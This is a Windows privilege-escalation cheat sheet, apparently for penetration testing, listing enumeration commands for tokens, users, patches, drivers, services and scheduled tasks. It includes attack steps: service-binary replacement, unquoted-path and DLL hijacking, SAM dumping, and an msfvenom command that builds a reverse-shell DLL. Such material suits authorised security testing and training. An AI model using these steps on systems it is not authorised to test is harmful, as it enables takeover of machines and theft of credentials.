Windows Privilege Escalation

1. Identity & Token Enumeration
whoami
echo %USERNAME%
whoami /priv
whoami /groups
whoami /all

Always start here. Identify user, privileges, groups and Integrity Level.

  • SeBackupPrivilege → Dump SAM / SYSTEM
  • SeRestorePrivilege → Overwrite protected files
  • SeImpersonatePrivilege → Token impersonation (Potato)
  • Integrity Level High → Elevated token
2. Users & Groups
net user
net user username
net localgroup
net localgroup Administrators
net user /domain
net group /domain

Look for misconfigurations or users in privileged groups.

3. System Enumeration
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic logicaldisk get caption,description
wmic product get name,version,vendor

Identify OS version, architecture and missing patches.

Drivers

driverquery /v
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name','Start Mode',Path
Get-WmiObject Win32_PnPSignedDriver | Select DeviceName,DriverVersion,Manufacturer

6. Services Enumeration
sc query
sc qc ServiceName
wmic service get name,displayname,pathname,startmode

Look for:

  • Unquoted paths
  • Writable service binaries
  • Weak permissions
  • Service running as SYSTEM
7. Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto"

If path contains spaces and no quotes → possible hijack.

Example: 
C:\Program Files\Vulnerable App\service.exe
Place malicious executable in: 
C:\Program.exe
8. Service Binary Hijacking
icacls "C:\Path\To\ServiceBinary.exe"

If writable and service runs as SYSTEM → replace binary.

sc stop ServiceName
copy malicious.exe ServiceBinary.exe
sc start ServiceName
9. DLL Hijacking

Service tries loading missing DLL.

Check writable directory: 
icacls C:\ServiceDirectory
Generate DLL: 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o malicious.dll
Restart service.

10. Scheduled Tasks
schtasks /query /fo LIST /v

Check task binary path and permissions.

icacls C:\Path\To\TaskBinary.exe
If writable and runs as SYSTEM → replace binary.
